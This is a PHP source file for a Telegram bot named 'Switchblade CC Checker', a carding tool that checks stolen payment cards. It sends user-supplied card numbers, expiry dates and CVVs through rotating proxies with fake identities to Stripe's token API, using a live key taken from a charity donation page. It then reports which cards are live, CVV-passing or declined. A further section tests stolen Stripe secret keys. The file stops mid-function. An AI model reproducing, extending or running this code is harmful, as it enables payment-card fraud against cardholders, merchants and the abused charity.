<?php

// Switchblade CC Checker - Developed from 1 August 2021 by @rizzyneck
// Base from Andrymata - Made with ❤
// Last updated 18 September 2021
// Webhook: https://api.telegram.org/bot<token>/setwebhook?url=<url>

// BOT API Configuration
$botToken = "TOKEN"; #<------------------- PUT YOUR TOKEN HERE------------->#
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

// Start Commands
if ((strpos($message, "/start") === 0)||(strpos($message, "/start") === 0)){
sendMessage ($chatId, "─ Switchblade Checker Panel ─ %0A⁕ Registered as ➞ @$username %0A⁕ Use ➞ /cmds to show available commands. %0A⁕ Owner ➞ @pentagrvm | Update Logs ➞ @switchbladeupdate", $message_id);
}

// Cmds Commands
elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "─ Switchblade Commands ─%0A%0A<b>➣ Stripe Charge/Auth [✅]</b>%0AUsage: <code>/chk cc|mm|yy|cvv</code>%0A%0A<b>➣ Check SK Key [✅]</b>%0AUsage: <code>/key sk_live</code>%0A%0A<b>➣ Check Info [✅]</b>%0AUsage: <code>/info</code>%0A%0A<b>➣ Check BIN Info [✅]</b>%0AUsage: <code>/bin xxxxxx</code>%0A%0AContact → <b>@pentagrvm</b>");
}

// Bin Check Commands
elseif ((strpos($message, "/bin $bin") === 0)||(strpos($message, "!bin $bin") === 0)||(strpos($message, ".bin $bin") === 0)){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$bin = substr("$bin", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = strtoupper(GetStr($fim, '"bank":{"name":"', '"'));
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));
if(strpos($fim, '"type":"Credit"') !== false){
};
sendMessage($chatId, '<b>⁕ ─ 𝗩𝗔𝗟𝗜𝗗 𝗕𝗜𝗡 ✅ ─ ⁕</b>%0A BIN: <b>'.$bin.'</b>%0A BANK: <b>'.$bank.'</b>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>' . $name . '  ('.$emoji.')</b>%0A BRAND: <b>' . $brand . '</b>%0A CARD: <b>' . $scheme . '</b>%0A TYPE: <b>' . $type . '</b>%0A<b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b> CHECKED BY </b>: @'.$username.'', $message_id);
}

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "⁕ ─ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ─ ⁕%0AChat ID: <code>$chatId</code>%0AName: $firstname%0AUsername: @$username");
}

elseif ((strpos($message, "!id") === 0)||(strpos($message, "/id") === 0)){
sendMessage($chatId, "<b>Chat ID:</b> <code>$chatId</code>");
}

// Randomize User Agent
function random_ua() {
    $tiposDisponiveis = array("Chrome", "Firefox", "Opera", "Explorer");
    $tipoNavegador = $tiposDisponiveis[array_rand($tiposDisponiveis)];
    switch ($tipoNavegador) {
        case 'Chrome':
            $navegadoresChrome = array("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
            );
            return $navegadoresChrome[array_rand($navegadoresChrome)];
            break;
        case 'Firefox':
            $navegadoresFirefox = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
                'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
            );
            return $navegadoresFirefox[array_rand($navegadoresFirefox)];
            break;
        case 'Opera':
            $navegadoresOpera = array("Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
                'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
                'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
                'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
                'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
                'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
                'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
                'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
                'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
        case 'Explorer':
            $navegadoresOpera = array("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
    }
}
$ua = random_ua();

// Checking CC's Commands
if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

// Bin Look-up
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = GetStr($fim, '"brand":"', '"');
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2." (".$emoji.")";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);


// Generate Random Data
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

// Proxy Configuration
$rp1 = array(
    1 => 'URPROXY',
    2 => 'URPROXY',
    3 => 'URPROXY',
    4 => 'URPROXY',
    5 => 'URPROXY',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

// Stripe Requests
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'authority: api.stripe.com',
        'method: POST',
        'path: /v1/tokens',
        'scheme: https',
        'accept: application/json',
        'accept-language: en-US,en;q=0.9',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://checkout.stripe.com',
        'referer: https://checkout.stripe.com/',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
        'x-requested-with: XMLHttpRequest',
   ));

   curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2F308cc4f)&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F92.0.4515.159+Safari%2F537.36&device_id=f0b0d9b9-805b-4125-a7c7-5b414a04aa2c&referrer=https%3A%2F%2Fdonate-can.keela.co%2Fembed%2Ffoundations-for-social-change&time_checkout_opened=1629544338&time_checkout_loaded=1629544338&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]='.$name.'&time_on_page=&guid=bab66549-00a4-453d-bb46-c1a5b4574ae605f1ee&muid=593746ec-57dd-4c47-af62-262eb860137da6aeff&sid=f3abed8b-e4d2-4b80-bfa3-8eb3e3829f270b151a&key=pk_live_moSrTlu0TpyA6fT2puny9SWr');

 $result1 = curl_exec($ch);
 $cvc_check = trim(strip_tags(getStr($result1,'"cvc_check":"','"')));
 $decline_check = trim(strip_tags(getStr($result1,'"decline_code":"','"')));
 $info = curl_getinfo($ch);
 $time = $info['total_time'];
 $httpCode = $info['http_code'];
 $time = substr($time, 0, 4);
 curl_close($ch);

// Responses

if ((strpos($result1, 'incorrect_zip')) || (strpos($result1, 'Your card zip code is incorrect.')) || (strpos($result1, 'The zip code you supplied failed validation.'))){

sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Incorrect ZIP Code </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, '"cvc_check":"pass"')) || (strpos($result1, "Thank You.")) || (strpos($result1, '"status": "succeeded"')) || (strpos($result1, "Thank You For Donation.")) || (strpos($result1, "Your payment has already been processed")) || (strpos($result1, "Success ")) || (strpos($result1, '"type":"one-time"')) || (strpos($result1, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Charged 9$.%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, 'Your card has insufficient funds.')) || (strpos($result1, 'insufficient_funds'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Insufficient Funds. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif ((strpos($result1, "Your card's security code is incorrect.")) || (strpos($result1, "incorrect_cvc")) || (strpos($result1, "The card's security code is incorrect."))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Incorrect CVC. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CCN PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, "Your card does not support this type of purchase.")) || (strpos($result1, "transaction_not_allowed"))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code> %0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Charge Rejected. </b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, "pickup_card")) || (strpos($result1, "lost_card")) || (strpos($result1, "stolen_card"))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Pickup Card/Stolen Card. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif (strpos($result1, "do_not_honor")){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Do Not Honor. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Your card number is incorrect. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>Incorrect (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif ((strpos($result1, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Expired Card. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>Expired (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif ((strpos($result1, "Your card was declined.")) || (strpos($result1, 'The card was declined.'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Your card was declined.</b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif (strpos($result1, '"decline_code": "generic_decline"')){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Generic Decline. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Generic Decline. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, '"cvc_check":"unavailable"')) || (strpos($result1, '"cvc_check": "unchecked"')) || (strpos($result1, '"cvc_check": "fail"'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Security Code Check : '.$cvc_check.' PROXY DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif (strpos($result1, 'null')){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code> %0A BRAND: <b>'.$brand.'</b> %0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A MESSAGE: <b>GATE ERROR (❌)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, "missing input"))){
sendMessage($chatId, '❌Invalid Command❌%0A❗️GATE CHK AUTH%0A❗️Example: /chk xxxxxxxxxxxxxxxx|xx|xx|xxx%0A❗️EX :- /chk 4010990064374103|09|2026|345');
}

elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}

// Bonus: SK Key Checker

elseif ((strpos($message, "/key") === 0)||(strpos($message, "!key") === 0)||(strpos($message, ".key") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=252");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);


if (strpos($result, 'api_key_expired')){
